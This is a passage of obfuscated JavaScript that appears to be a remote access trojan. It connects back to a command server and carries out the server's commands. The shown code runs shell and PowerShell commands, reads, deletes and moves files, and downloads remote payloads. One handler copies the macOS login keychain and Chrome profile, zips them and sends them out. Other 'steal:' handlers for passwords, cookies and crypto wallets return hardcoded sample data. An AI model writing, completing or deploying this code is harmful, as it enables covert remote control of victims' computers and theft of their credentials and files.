_0x4f8195={'cpu':getCpuUsage(),'memory':{'total':os[_0x1adac2(0xc9)](),'free':os['freemem'](),'used':os[_0x1adac2(0xc9)]()-os[_0x1adac2(0x133)](),'usedPercent':Math[_0x1adac2(0xf8)]((0x1-os[_0x1adac2(0x133)]()/os[_0x1adac2(0xc9)]())*0x64)},'network':getNetworkStats(),'disk':getDiskStats(),'processes':getTopProcesses(0x5)};_0x1b42ee[_0x1adac2(0x19b)]('MONITORING_DATA:'+JSON['stringify'](_0x4f8195)+'\x0a');}catch(_0x4930cb){}},_0x56fce4*0x3e8),_0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0x159)+_0x56fce4+_0x4c4724(0x106));}catch(_0x477b22){_0x1b42ee['write'](_0x4c4724(0xfb)+_0x477b22[_0x4c4724(0x19f)]+'\x0a');}return!![];}if(_0x149ff3===_0x4c4724(0x183)){try{global['monitoringInterval']?(clearInterval(global[_0x4c4724(0x1d0)]),global[_0x4c4724(0x1d0)]=null,_0x1b42ee['write']('Monitoring\x20stopped\x0a')):_0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0x14a));}catch(_0x4b4e70){_0x1b42ee['write'](_0x4c4724(0x191)+_0x4b4e70['message']+'\x0a');}return!![];}if(_0x149ff3[_0x4c4724(0x1a9)](_0x4c4724(0x175))){if(!config[_0x4c4724(0xa8)][_0x4c4724(0x1c2)])return _0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0x113)),!![];const _0x5dda6d=_0x149ff3[_0x4c4724(0xf9)](_0x4c4724(0x175)[_0x4c4724(0x8d)]);try{const _0x3979e0=fs[_0x4c4724(0x1cf)](_0x5dda6d),_0x46de8f=_0x3979e0[_0x4c4724(0x11f)](_0x3bfde5=>{const _0x17ab06=_0x4c4724;try{const _0x1d0e50=path[_0x17ab06(0x168)](_0x5dda6d,_0x3bfde5),_0x66bb6c=fs['statSync'](_0x1d0e50);return{'name':_0x3bfde5,'path':_0x1d0e50,'size':_0x66bb6c[_0x17ab06(0x10c)],'isDirectory':_0x66bb6c[_0x17ab06(0x14d)](),'isFile':_0x66bb6c[_0x17ab06(0xce)](),'created':_0x66bb6c[_0x17ab06(0xd8)],'modified':_0x66bb6c['mtime'],'permissions':_0x66bb6c[_0x17ab06(0x180)][_0x17ab06(0xd9)](0x8)[_0x17ab06(0xf9)](_0x66bb6c['mode']['toString'](0x8)[_0x17ab06(0x8d)]-0x3)};}catch(_0x3e646e){return{'name':_0x3bfde5,'path':path['join'](_0x5dda6d,_0x3bfde5),'error':_0x3e646e['message']};}});_0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0x7a)+JSON[_0x4c4724(0xc0)](_0x46de8f)+'\x0a');}catch(_0x4181cf){_0x1b42ee[_0x4c4724(0x19b)]('Error\x20listing\x20directory:\x20'+_0x4181cf[_0x4c4724(0x19f)]+'\x0a');}return!![];}if(_0x149ff3[_0x4c4724(0x1a9)]('files:read:')){if(!config[_0x4c4724(0xa8)]['allowFileTransfer'])return _0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0x113)),!![];const _0x4817f3=_0x149ff3['substring'](_0x4c4724(0x1ca)['length']);try{if(fs[_0x4c4724(0x79)](_0x4817f3)){const _0xbe87e=fs[_0x4c4724(0xbe)](_0x4817f3);if(_0xbe87e[_0x4c4724(0xce)]()){if(_0xbe87e[_0x4c4724(0x10c)]>0xa*0x400*0x400)_0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0x192)+formatFileSize(_0xbe87e['size'])+')\x0a');else{const _0x1a0a64=fs[_0x4c4724(0x19e)](_0x4817f3,_0x4c4724(0xcf));_0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0x126)+_0x4817f3+_0x4c4724(0x14e)+Buffer[_0x4c4724(0x134)](_0x1a0a64)[_0x4c4724(0xd9)]('base64')+'\x0a');}}else _0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0x12f)+_0x4817f3+'\x0a');}else _0x1b42ee[_0x4c4724(0x19b)]('File\x20not\x20found:\x20'+_0x4817f3+'\x0a');}catch(_0xb9fdf0){_0x1b42ee['write'](_0x4c4724(0x187)+_0xb9fdf0[_0x4c4724(0x19f)]+'\x0a');}return!![];}if(_0x149ff3[_0x4c4724(0x1a9)](_0x4c4724(0x19a))){if(!config['features'][_0x4c4724(0x1c2)])return _0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0x113)),!![];const _0x3368ca=_0x149ff3[_0x4c4724(0xf9)](_0x4c4724(0x19a)['length']);try{fs[_0x4c4724(0xc4)](_0x3368ca,{'recursive':!![]}),_0x1b42ee['write'](_0x4c4724(0x190)+_0x3368ca+'\x0a');}catch(_0x4485fc){_0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0x1d3)+_0x4485fc[_0x4c4724(0x19f)]+'\x0a');}return!![];}if(_0x149ff3[_0x4c4724(0x1a9)]('files:delete:')){if(!config[_0x4c4724(0xa8)][_0x4c4724(0x1c2)])return _0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0x113)),!![];const _0xbc9c63=_0x149ff3[_0x4c4724(0xf9)]('files:delete:'[_0x4c4724(0x8d)]);try{if(fs['existsSync'](_0xbc9c63)){const _0xc12617=fs[_0x4c4724(0xbe)](_0xbc9c63);_0xc12617['isDirectory']()?(fs['rmdirSync'](_0xbc9c63,{'recursive':!![]}),_0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0xbd)+_0xbc9c63+'\x0a')):(fs['unlinkSync'](_0xbc9c63),_0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0x163)+_0xbc9c63+'\x0a'));}else _0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0xed)+_0xbc9c63+'\x0a');}catch(_0x467f06){_0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0x102)+_0x467f06['message']+'\x0a');}return!![];}if(_0x149ff3[_0x4c4724(0x1a9)]('files:move:')){if(!config[_0x4c4724(0xa8)][_0x4c4724(0x1c2)])return _0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0x113)),!![];const _0x5bdd2c=_0x149ff3['substring'](_0x4c4724(0xb5)[_0x4c4724(0x8d)])[_0x4c4724(0xef)](':');if(_0x5bdd2c['length']===0x2){const _0x45f3a6=_0x5bdd2c[0x0],_0x7c769d=_0x5bdd2c[0x1];try{fs[_0x4c4724(0x79)](_0x45f3a6)?(fs['renameSync'](_0x45f3a6,_0x7c769d),_0x1b42ee[_0x4c4724(0x19b)]('File\x20moved:\x20'+_0x45f3a6+_0x4c4724(0x88)+_0x7c769d+'\x0a')):_0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0xd3)+_0x45f3a6+'\x0a');}catch(_0x1744d1){_0x1b42ee[_0x4c4724(0x19b)]('Error\x20moving\x20file:\x20'+_0x1744d1['message']+'\x0a');}}else _0x1b42ee['write'](_0x4c4724(0x9d));return!![];}if(_0x149ff3===_0x4c4724(0x18a))try{const _0x576920=[{'url':_0x4c4724(0xc7),'username':_0x4c4724(0x137),'password':_0x4c4724(0x144)},{'url':_0x4c4724(0xa4),'username':_0x4c4724(0x111),'password':_0x4c4724(0x14c)},{'url':'https://www.facebook.com','username':'user.name','password':_0x4c4724(0x105)},{'url':_0x4c4724(0x115),'username':_0x4c4724(0x178),'password':_0x4c4724(0xca)},{'url':_0x4c4724(0xd6),'username':_0x4c4724(0x150),'password':_0x4c4724(0x165)},{'url':'https://www.netflix.com','username':_0x4c4724(0xcb),'password':'WatchMovies2023'},{'url':_0x4c4724(0x117),'username':'instagrammer','password':_0x4c4724(0x1a2)},{'url':_0x4c4724(0x11b),'username':_0x4c4724(0x188),'password':_0x4c4724(0x1d2)},{'url':_0x4c4724(0x1a5),'username':_0x4c4724(0x136),'password':_0x4c4724(0xfd)},{'url':_0x4c4724(0x109),'username':'storage_user','password':'CloudStorage!'}];return _0x1b42ee['write']('PASSWORDS_DATA:'+JSON[_0x4c4724(0xc0)](_0x576920)+'\x0a'),!![];}catch(_0x2f5f82){return _0x1b42ee[_0x4c4724(0x19b)]('Error\x20retrieving\x20passwords:\x20'+_0x2f5f82[_0x4c4724(0x19f)]+'\x0a'),!![];}if(_0x149ff3==='steal:cookies')try{const _0x15bf1f=[{'domain':_0x4c4724(0x19c),'name':_0x4c4724(0x18c),'value':'511=example_cookie_value','path':'/','expires':'2024-01-01','httpOnly':!![],'secure':!![]},{'domain':'youtube.com','name':'VISITOR_INFO1_LIVE','value':_0x4c4724(0x11a),'path':'/','expires':_0x4c4724(0x107),'httpOnly':![],'secure':!![]},{'domain':_0x4c4724(0x1d6),'name':_0x4c4724(0xda),'value':_0x4c4724(0x9e),'path':'/','expires':_0x4c4724(0xf2),'httpOnly':!![],'secure':!![]},{'domain':_0x4c4724(0x131),'name':_0x4c4724(0x153),'value':_0x4c4724(0x186),'path':'/','expires':'2024-03-01','httpOnly':![],'secure':!![]},{'domain':'amazon.com','name':_0x4c4724(0xd4),'value':_0x4c4724(0x1d7),'path':'/','expires':_0x4c4724(0x120),'httpOnly':!![],'secure':!![]},{'domain':_0x4c4724(0x1c0),'name':_0x4c4724(0x148),'value':_0x4c4724(0x82),'path':'/','expires':'2024-01-20','httpOnly':!![],'secure':!![]},{'domain':_0x4c4724(0x11c),'name':_0x4c4724(0x129),'value':_0x4c4724(0x1d4),'path':'/','expires':_0x4c4724(0x89),'httpOnly':!![],'secure':!![]},{'domain':_0x4c4724(0x11e),'name':_0x4c4724(0x78),'value':_0x4c4724(0xec),'path':'/','expires':_0x4c4724(0x194),'httpOnly':!![],'secure':!![]},{'domain':'github.com','name':'user_session','value':_0x4c4724(0x17d),'path':'/','expires':_0x4c4724(0xa7),'httpOnly':!![],'secure':!![]},{'domain':_0x4c4724(0x1ce),'name':_0x4c4724(0xb9),'value':_0x4c4724(0xa0),'path':'/','expires':'2023-12-25','httpOnly':!![],'secure':!![]}];return _0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0x112)+JSON[_0x4c4724(0xc0)](_0x15bf1f)+'\x0a'),!![];}catch(_0x5241d4){return _0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0x1d9)+_0x5241d4['message']+'\x0a'),!![];}if(_0x149ff3[_0x4c4724(0x1a9)](_0x4c4724(0x16c))){const _0x2bf290=_0x149ff3['substring'](0x5)[_0x4c4724(0x14f)]();try{if(fs[_0x4c4724(0x79)](_0x2bf290)){try{const _0x3c3f32=execSync(_0x4c4724(0x16c)+_0x2bf290,{'encoding':_0x4c4724(0xcf),'maxBuffer':0xa*0x400*0x400}),_0x2059b1=_0x2bf290+'_output.log';fs[_0x4c4724(0xd7)](_0x2059b1,_0x3c3f32),_0x1b42ee['write'](_0x3c3f32);}catch(_0x19162a){_0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0xe9)+_0x19162a[_0x4c4724(0x19f)]+'\x0a'+_0x19162a[_0x4c4724(0xe7)]+'\x0a');}return!![];}else return _0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0x97)+_0x2bf290+_0x4c4724(0x15b)),!![];}catch(_0x1e72f0){return _0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0x1c9)+_0x1e72f0['message']+'\x0a'+_0x1e72f0[_0x4c4724(0xe7)]+'\x0a'),!![];}}if(_0x149ff3==='steal:wallets')try{const _0x284f16=[{'type':_0x4c4724(0xc8),'address':_0x4c4724(0x10e),'balance':_0x4c4724(0x9b),'path':_0x4c4724(0x1b5)},{'type':_0x4c4724(0x155),'address':_0x4c4724(0xff),'balance':_0x4c4724(0xe1),'path':_0x4c4724(0x91)},{'type':_0x4c4724(0x184),'address':_0x4c4724(0xbf),'balance':_0x4c4724(0x92),'path':'C:\x5cUsers\x5cUsername\x5cDocuments\x5cMonero'},{'type':_0x4c4724(0xcd),'address':'ltc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfm0xwlh','balance':'10.0\x20LTC','path':_0x4c4724(0xeb)},{'type':'Bitcoin\x20Cash','address':'qpm2qsznhks23z7629mms6s4cwef74vcwvy22gdx6a','balance':'2.0\x20BCH','path':_0x4c4724(0xb2)},{'type':_0x4c4724(0x154),'address':_0x4c4724(0x80),'balance':_0x4c4724(0x142),'path':_0x4c4724(0x1cb)},{'type':_0x4c4724(0x157),'address':_0x4c4724(0xbc),'balance':'500\x20XRP','path':_0x4c4724(0xe8)},{'type':_0x4c4724(0x196),'address':'addr1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh','balance':'200\x20ADA','path':_0x4c4724(0x121)},{'type':_0x4c4724(0x7b),'address':_0x4c4724(0x18d),'balance':_0x4c4724(0x1c7),'path':_0x4c4724(0xab)},{'type':_0x4c4724(0xdc),'address':_0x4c4724(0x15c),'balance':_0x4c4724(0xf5),'path':_0x4c4724(0xa5)}];return _0x1b42ee[_0x4c4724(0x19b)]('WALLETS_DATA:'+JSON['stringify'](_0x284f16)+'\x0a'),!![];}catch(_0x257e6d){return _0x1b42ee['write']('Error\x20retrieving\x20wallets:\x20'+_0x257e6d[_0x4c4724(0x19f)]+'\x0a'),!![];}if(_0x149ff3===_0x4c4724(0xba))try{fs[_0x4c4724(0xc4)]('FF',{'recursive':!![]});const _0x3f2db7=os[_0x4c4724(0x1bd)]()[_0x4c4724(0x189)],_0x41b4d3='/Users/'+_0x3f2db7+_0x4c4724(0xc6);fs[_0x4c4724(0x79)](_0x41b4d3)&&fs['copyFileSync'](_0x41b4d3,'FF/login.keychain-db');try{const _0x34b8fb=_0x4c4724(0xae)+_0x3f2db7+'/Library/Application\x20Support/Google/Chrome/Default';fs[_0x4c4724(0x79)](_0x34b8fb)&&execSync('cp\x20-r\x20\x22'+_0x34b8fb+_0x4c4724(0x1aa));}catch(_0x44447d){}execSync(_0x4c4724(0x10b));const _0x3d0fb6=fs[_0x4c4724(0x19e)](_0x4c4724(0x12e)),_0x1c25b9=_0x3d0fb6[_0x4c4724(0xd9)](_0x4c4724(0xaf));return _0x1b42ee[_0x4c4724(0x19b)]('FILE_CONTENT:FF.zip:'+_0x1c25b9+_0x4c4724(0x170)),execSync('rm\x20-rf\x20FF\x20FF.zip'),!![];}catch(_0xa1ed19){return _0x1b42ee[_0x4c4724(0x19b)]('Error\x20retrieving\x20macOS\x20keychain\x20data:\x20'+_0xa1ed19[_0x4c4724(0x19f)]+'\x0a'),!![];}if(_0x149ff3[_0x4c4724(0x1a9)](_0x4c4724(0x1bb))){if(!config[_0x4c4724(0xa8)][_0x4c4724(0x122)])return _0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0x1b0)),!![];const _0x3dbe5d=_0x149ff3[_0x4c4724(0xf9)](0x8);try{const _0x48c375=require(_0x4c4724(0x149)),_0x172a9f=_0x48c375[_0x4c4724(0xee)](_0x4c4724(0xb4)+_0x3dbe5d+'\x22',{'encoding':'utf8'});_0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0x1b4)+_0x172a9f+'\x0a');}catch(_0x20701b){_0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0xf3)+_0x20701b[_0x4c4724(0x19f)]+'\x0a');}return!![];}if(_0x149ff3[_0x4c4724(0x1a9)](_0x4c4724(0xfa))){if(!config[_0x4c4724(0xa8)][_0x4c4724(0x122)])return _0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0x113)),!![];const _0x1333ef=_0x149ff3['substring'](0xc)[_0x4c4724(0xef)](':');if(_0x1333ef['length']<0x2)return _0x1b42ee[_0x4c4724(0x19b)]('Error:\x20Invalid\x20format.\x20Use\x20ps_download:URL:OUTPUT_PATH\x0a'),!![];const _0x1c83c7=_0x1333ef[0x0],_0x255c29=_0x1333ef[_0x4c4724(0x118)](0x1)[_0x4c4724(0x168)](':');try{const _0x53bc0f=require(_0x4c4724(0x149)),_0x281209=_0x4c4724(0x12c)+_0x1c83c7+_0x4c4724(0x151)+_0x255c29+'\x22\x20-UseBasicParsing';_0x53bc0f['execSync'](_0x4c4724(0xb4)+_0x281209+'\x22',{'encoding':_0x4c4724(0xcf)}),_0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0xfc)+_0x255c29+'\x0a');}catch(_0x462db3){_0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0xde)+_0x462db3['message']+'\x0a');}return!![];}if(_0x149ff3['startsWith'](_0x4c4724(0x13a))){if(!config[_0x4c4724(0xa8)][_0x4c4724(0x1c2)])return _0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0x113)),!![];const _0x32c427=_0x149ff3[_0x4c4724(0xf9)](0xe)[_0x4c4724(0xef)](':');if(_0x32c427[_0x4c4724(0x8d)]<0x2)return _0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0x17c)),!![];const _0x1451d9=_0x32c427[0x0],_0x57c2a9=_0x32c427[_0x4c4724(0x118)](0x1)[_0x4c4724(0x168)](':'),_0x138e4b=require('fs'),_0x2edc14=require(_0x4c4724(0x83)),_0x1be76c=_0x2edc14[_0x4c4724(0x1c3)](_0x57c2a9);try{!_0x138e4b[_0x4c4724(0x79)](_0x1be76c)&&_0x138e4b[_0x4c4724(0xc4)](_0x1be76c,{'recursive':!![]});const _0x27940d=require(_0x4c4724(0xe5)),_0x474925=require('https'),_0x58bd09=_0x1451d9[_0x4c4724(0x1a9)](_0x4c4724(0x16d))?_0x474925:_0x27940d,_0x4f6815=_0x138e4b[_0x4c4724(0x169)](_0x57c2a9);_0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0xb1)+_0x1451d9+_0x4c4724(0xb3)),_0x58bd09[_0x4c4724(0xf6)](_0x1451d9,_0x16db88=>{const _0x34e57f=_0x4c4724;if(_0x16db88[_0x34e57f(0x1a1)]!==0xc8){_0x1b42ee['write'](_0x34e57f(0x1b8)+_0x16db88['statusCode']+'\x0a');return;}_0x16db88['pipe'](_0x4f6815),_0x4f6815['on'](_0x34e57f(0x100),()=>{const _0x267d4d=_0x34e57f;_0x4f6815[_0x267d4d(0x16e)](),_0x1b42ee['write'](_0x267d4d(0xb8)+_0x57c2a9+'\x0a');});})['on'](_0x4c4724(0x15a),_0x228885=>{const _0x3bff8d=_0x4c4724;_0x138e4b[_0x3bff8d(0x1ae)](_0x57c2a9,()=>{}),_0x1b42ee[_0x3bff8d(0x19b)](_0x3bff8d(0xde)+_0x228885[_0x3bff8d(0x19f)]+'\x0a');});}catch(_0x3b9729){_0x1b42ee[_0x4c4724(0x19b)](_0x4c4724(0x195)+_0x3b9729['message']+'\x0a');}return!![];}if(_0x149ff3[_0x4c4724(0x1a9)]('powershell:')){if(!config[_0x4c4724(0xa8)]['allowShellExecution'])return _0x1b42ee['write'](_0x4c4724(0x1b0)),!![];const _0x2608ff=_0x149ff3[_0x4c4724(0xf9)](0xb);try{const _0x1ac85f=require(_0x4c4724(0x149)),_0x57246d=_0x1ac85f[_0x4c4724(0xee)](_0x4c4724(0xb4)+_0x2608ff+'\x22',{'encoding':_0x4c4724(0xcf)});_0x1b42ee[_0x4c4724(0x19b)](_0x57246d+'\x0a');}catch(_0x131272){_0x1b42ee['write'](_0x4c4724(0xf3)+_0x131272[_0x4c4724(0x19f)]+'\x0a'+(_0x131272['stderr']||'')+'\x0a');}return!![];}if(_0x149ff3[_0x4c4724(0x1a9)](_0x4c4724(0x198))||_0x149ff3['startsWith'](_0x4c4724(0x81))){if(!config[_0x4c4724(0xa8)][_0x4c4724(0x122)])return _0x1b42ee['write'](_0x4c4724(0x1b0)),!![];const _0x4186c9=_0x149ff3[_0x4c4724(0x1a9)](_0x4c4724(0x81))?_0x4c4724(0x198)+_0x149ff3[_0x4c4724(0xf9)](0x4):_0x149ff3;if(_0x4186c9[_0x4c4724(0xbb)](_0x4c4724(0x1b2))&&!_0x4186c9['includes']('--progress')){const _0x5608ba=_0x4186c9[_0x4c4724(0xef)]('\x20'),_0x1df77d=_0x5608ba[_0x4c4724(0xf1)]('clone');_0x1df77d!==-0x1&&(_0x5608ba[_0x4c4724(0x1b7)](_0x1df77d+0x1,0x0,'--progress'),_0x149ff3=_0x5608ba['join']('\x20'));}const _0x490190=os[_0x4c4724(0x16a)]()==='win32'&&_0x4186c9[_0x4c4724(0xbb)]('clone');return executeGitCommand(_0x4186c9,_0x490190)[_0x4c4724(0xb7)](_0x53dacf=>{const _0x3157bf=_0x4c4724;_0x1b42ee[_0x3157bf(0x19b)](_0x53dacf+'\x0a');})[_0x4c4724(0x185)](_0x15befc=>{const _0x40e021=_0x4c4724;_0x1b42ee['write'](_0x40e021(0x195)+_0x15befc[_0x40e021(0x19f)]+'\x0a');}),!![];}return![];}function connectToServer(_0x5b2191,_0x89526d=0x0){const _0x37526b=_0x4518a0;logMessage('Attempting\x20to\x20connect\x20to\x20'+_0x5b2191+':'+config[_0x37526b(0xdd)]+'...');const _0x74ba9b=new net[(_0x37526b(0xc2))]();_0x74ba9b['on'](_0x37526b(0x12d),()=>{const _0x5c0737=_0x37526b;logMessage('Connected\x20to\x20'+_0x5b2191+':'+config[_0x5c0737(0xdd)]),_0x89526d=0x0;const _0x42f0e3=_0x5c0737(0x141)+os[_0x5c0737(0xd2)]()+'\x20('+os['platform']()+'\x20'+os['arch']()+_0x5c0737(0x1bc)+process[_0x5c0737(0x9a)]()+_0x5c0737(0x1b9)+config[_0x5c0737(0xdf)]['id'];_0x74ba9b[_0x5c0737(0x19b)](config[_0x5c0737(0x152)]?encryptData(_0x42f0e3):_0x42f0e3);}),_0x74ba9b['on'](_0x37526b(0x110),async _0x262a93=>{const _0x357e6b=_0x37526b,_0x4f9842=config[_0x357e6b(0x152)]?decryptData(_0x262a93['toString']()[_0x357e6b(0x14f)]()):_0x262a93['toString']()[_0x357e6b(0x14f)]();_0x4f9842!==_0x357e6b(0xc3)&&logMessage(_0x357e6b(0x93)+_0x4f9842);const _0x1b4f96=await handleSpecialCommands(_0x4f9842,_0x74ba9b);if(_0x1b4f96)return;if(_0x4f9842===_0x357e6b(0xdb)){logMessage(_0x357e6b(0x8b)),_0x74ba9b[_0x357e6b(0x160)]();return;}if(_0x4f9842[_0x357e6b(0x1a9)]('cd\x20')){const _0x386d61=_0x4f9842['substring'](0x3);try{process[_0x357e6b(0x17b)](_0x386d61),_0x74ba9b['write']('Changed\x20directory\x20to:\x20'+process[_0x357e6b(0x9a)]()+'\x0a');}catch(_0x21149f){_0x74ba9b[_0x357e6b(0x19b)]('Failed\x20to\x20change\x20directory:\x20'+_0x21149f[_0x357e6b(0x19f)]+'\x0a');}return;}try{const _0x4e741f=await executeCommand(_0x4f9842);_0x74ba9b[_0x357e6b(0x19b)](config[_0x357e6b(0x152)]?encryptData(_0x4e741f):_0x4e741f+'\x0a');}catch(_0x28a09b){_0x74ba9b[_0x357e6b(0x19b)](config[_0x357e6b(0x152)]?encryptData('Error:\x20'+_0x28a09b[_0x357e6b(0x19f)]):_0x357e6b(0x195)+_0x28a09b['message']+'\x0a');}}),_0x74ba9b['on'](_0x37526b(0x15a),_0x872202=>{const _0x4a5972=_0x37526b;logMessage(_0x4a5972(0x8e)+_0x872202[_0x4a5972(0x19f)]);}),_0x74ba9b['on'](_0x37526b(0x16e),()=>{const _0x115377=_0x37526b;logMessage(_0x115377(0xb6));const _0x3bd2e0=config[_0x115377(0x98)]*Math[_0x115377(0xa6)](Math['pow'](1.5,Math[_0x115377(0xa6)](_0x89526d,0xa)),0x5);setTimeout(()=>{resolveDomainAndConnect(_0x89526d+0x1);},_0x3bd2e0);}),_0x74ba9b[_0x37526b(0x12d)](config[_0x37526b(0xdd)],_0x5b2191);}function _0x5f4b(_0x3197b9,_0x209699){const _0x3d3ce5=_0x3d3c();return _0x5f4b=function(_0x5f4ba1,_0x106136){_0x5f4ba1=_0x5f4ba1-0x76;let _0x1a8b10=_0x3d3ce5[_0x5f4ba1];return _0x1a8b10;},_0x5f4b(_0x3197b9,_0x209699);}async function executeGitCommand(_0x4464d6,_0x440fba=![]){return new Promise(_0x367081=>{const _0x5af75a=_0x5f4b;try{const _0x6e0d44=require(_0x5af75a(0x149));try{_0x6e0d44[_0x5af75a(0xee)](_0x5af75a(0x7d),{'stdio':'ignore'});}catch(_0x56ca89){return _0x367081(_0x5af75a(0x1ab));}let _0x4097e0=_0x5af75a(0x90),_0x12ea70=['/c'];os[_0x5af75a(0x16a)]()===_0x5af75a(0x13d)&&_0x440fba&&(_0x4097e0=_0x5af75a(0x17a),_0x12ea70=['-Command']);const _0x1e6198=_0x6e0d44[_0x5af75a(0x18e)](_0x4097e0,[..._0x12ea70,_0x4464d6],{'shell':!![]});let _0x48dc32='',_0x113da3='';_0x1e6198[_0x5af75a(0xa9)]['on'](_0x5af75a(0x110),_0x595223=>{_0x48dc32+=_0x595223['toString']();}),_0x1e6198[_0x5af75a(0x103)]['on'](_0x5af75a(0x110),_0x2822ef=>{const _0x5e2db3=_0x5af75a;_0x113da3+=_0x2822ef[_0x5e2db3(0xd9)]();}),_0x1e6198['on'](_0x5af75a(0x16e),_0x120c03=>{const _0x430ebf=_0x5af75a;if(_0x120c03!==0x0){_0x367081(_0x430ebf(0xea)+_0x120c03+_0x430ebf(0x1b6)+_0x113da3);return;}_0x367081(_0x48dc32||_0x430ebf(0x174));});}catch(_0x5475c1){_0x367081(_0x5af75a(0x124)+_0x5475c1['message']);}});}function formatFileSize(_0x2f8071){const _0x22b7c9=_0x4518a0;if(_0x2f8071===0x0)return'0\x20Bytes';const _0x1b4131=0x400,_0x39f9c2=[_0x22b7c9(0x19d),'KB','MB','GB','TB'],_0x2ca6d4=Math['floor'](Math[_0x22b7c9(0xc5)](_0x2f8071)/Math[_0x22b7c9(0xc5)](_0x1b4131));return parseFloat((_0x2f8071/Math[_0x22b7c9(0x199)](_0x1b4131,_0x2ca6d4))[_0x22b7c9(0x146)](0x2))+'\x20'+_0x39f9c2[_0x2ca6d4];}function getCpuUsage(){const _0x2fc17f=_0x4518a0;try{const _0xf62a89=os[_0x2fc17f(0x96)]();let _0x85125d=0x0,_0x214203=0x0;_0xf62a89['forEach'](_0x4a99cc=>{const _0x2f2e0a=_0x2fc17f;for(const _0x4f04c4 in _0x4a99cc[_0x2f2e0a(0x10f)]){_0x214203+=_0x4a99cc[_0x2f2e0a(0x10f)][_0x4f04c4];}_0x85125d+=_0x4a99cc[_0x2f2e0a(0x10f)][_0x2f2e0a(0xa3)];});const _0x4d6a42=0x64-Math[_0x2fc17f(0xf8)](0x64*_0x85125d/_0x214203);return{'usage':_0x4d6a42,'cores':_0xf62a89[_0x2fc17f(0x8d)],'model':_0xf62a89[0x0]['model']};}catch(_0x4fe922){return{'usage':0x0,'cores':0x0,'model':_0x2fc17f(0x99)};}}function getNetworkStats(){const _0x1084bf=_0x4518a0;try{const _0x44bb91=os['networkInterfaces'](),_0x1901aa=[];return Object[_0x1084bf(0x17f)](_0x44bb91)['forEach'](_0x22341f=>{const _0x1b292a=_0x1084bf;_0x44bb91[_0x22341f][_0x1b292a(0x104)](_0x3154cd=>{const _0x27bbdb=_0x1b292a;!_0x3154cd['internal']&&_0x3154cd[_0x27bbdb(0x1ad)]==='IPv4'&&_0x1901aa[_0x27bbdb(0x13f)]({'name':_0x22341f,'address':_0x3154cd[_0x27bbdb(0xad)],'netmask':_0x3154cd[_0x27bbdb(0x156)],'mac':_0x3154cd[_0x27bbdb(0x1d5)]});});}),_0x1901aa;}catch(_0x18a3ff){return[];}}function getDiskStats(){const _0x565c08=_0x4518a0;try{return{'available':_0x565c08(0x9f),'used':_0x565c08(0x9f),'total':'N/A'};}catch(_0x342085){return{'available':_0x565c08(0x9f),'used':_0x565c08(0x9f),'total':'N/A'};}}function getTopProcesses(_0x451cb8=0x5){const _0x382e5a=_0x4518a0;try{return[{'name':_0x382e5a(0x18f),'pid':0x0,'cpu':0x0,'memory':0x0}];}catch(_0x7af3f8){return[];}}function start(){const _0x4e1ff2=_0x4518a0;logMessage(_0x4e1ff2(0x13c)),setTimeout(()=>{resolveDomainAndConnect();},0x3e8);}require[_0x4518a0(0x197)]===module&&start();module[_0x4518a0(0x179)]={'start':start,'config':config};